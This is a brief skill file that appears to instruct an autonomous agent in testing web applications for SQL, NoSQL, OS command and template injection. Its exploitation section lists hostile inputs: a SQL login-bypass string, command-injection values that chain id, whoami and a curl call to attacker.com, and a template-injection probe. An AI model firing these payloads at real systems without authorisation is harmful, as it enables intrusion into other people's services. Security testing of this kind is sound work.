# Skill: OWASP A03 - Injection

This skill guides the agent in identifying SQL, NoSQL, OS Command, and Template injections.

## 1. Methodology (Autonomous Cycle)
- **Fuzzing**: Identify all input vectors (Query params, Body, Headers like \`User-Agent\`).
- **Taint Analysis**: Use \`fbh_scan\` to trace where user input reaches dangerous sinks (e.g., \`db.query()\`, \`os.system()\`).

## 2. Exploitation Tactics
- **SQLi**: Test for logic bypass (\`' OR 1=1 --\`) and time-based blind injection.
- **Command Injection**: Test with \`; id\`, \`&& whoami\`, or \`| curl attacker.com\`.
- **SSTI**: Test for template engine injection (e.g., \`{{7*7}}\`).

## 3. Tooling
- Use \`fbh_scan\` for core injection detection.
- Use \`fbh_research_vulnerability\` to find tech-specific injection payloads (e.g., "Mongoose NoSQL injection").
